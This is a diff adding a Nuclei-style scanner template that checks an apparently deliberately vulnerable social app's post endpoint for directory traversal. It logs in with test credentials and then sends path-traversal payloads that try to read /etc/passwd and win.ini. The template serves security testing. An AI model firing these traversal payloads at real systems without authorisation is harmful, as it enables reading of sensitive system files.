@@ -1,0 +1,49 @@
+id: vuln-sns-posts-directory-traversal
+info:
+  name: Vuln SNS Posts - Directory Traversal
+  author: claude
+  severity: high
+  description: |
+    Tests for directory traversal vulnerabilities in posts content.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  tags: vuln-sns,lfi,traversal,posts
+
+http:
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"user_id":"alice","password":"alice"}
+        
+      - |
+        POST /api/posts HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+        
+        {"content":"{{payload}}"}
+
+    payloads:
+      payload:
+        - "../../../etc/passwd"
+        - "..\\..\\..\\windows\\win.ini"
+        - "file:///etc/passwd"
+
+    extractors:
+      - type: regex
+        name: token
+        regex:
+          - '"token":\s*"([^"]+)"'
+        part: body_1
+        internal: true
+
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0"
+          - "[fonts]"
+        condition: or
+        part: body_2
